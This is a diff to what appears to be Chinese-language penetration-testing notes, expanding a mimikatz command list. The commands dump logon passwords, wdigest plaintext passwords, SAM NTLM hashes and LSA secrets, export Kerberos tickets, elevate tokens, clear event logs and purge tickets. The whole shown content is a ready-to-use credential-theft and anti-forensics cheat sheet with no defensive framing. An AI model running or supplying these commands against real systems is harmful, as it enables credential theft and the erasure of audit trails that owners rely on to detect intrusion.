@@ -85,24 +85,31 @@ kerberos::list
 ### mimikatz.exe
 
 ```powershell
-# 列出系统上的所有票据
-sekurlsa::tickets /export
 # 提升权限
 privilege::debug
-# 提取当前用户凭证
-sekurlsa::logonpasswords
-# 提取本地SAM数据库中的NTLM哈希
-lsadump::sam
+# 列出系统上的所有票据并提取
+sekurlsa::tickets /export
 # 列出当前用户的 Kerberos 票据（TGT 和 TGS）
 sekurlsa::tickets
-# 直接提取列出的票据
-sekurlsa::tickets /export
+# 提取当前用户凭证
+sekurlsa::logonpasswords
+# 提取当前系统中的明文密码
+sekurlsa::wdigest
+# 提取本地SAM数据库中的NTLM哈希
+lsadump::sam
+# 提取当前登录的域用户和本地用户的凭证
+lsadump::lsa /patch
+lsadump::lsa /inject
 # 列出当前用户的所有令牌
 token::list
 # 在令牌里发现有高权限的账户后，提升权限
 token::elevate
 # 清除日志
 event::clear
+# 清除内存中的票据
+kerberos::purge
+# 
+
 ```
 
 ### 其他
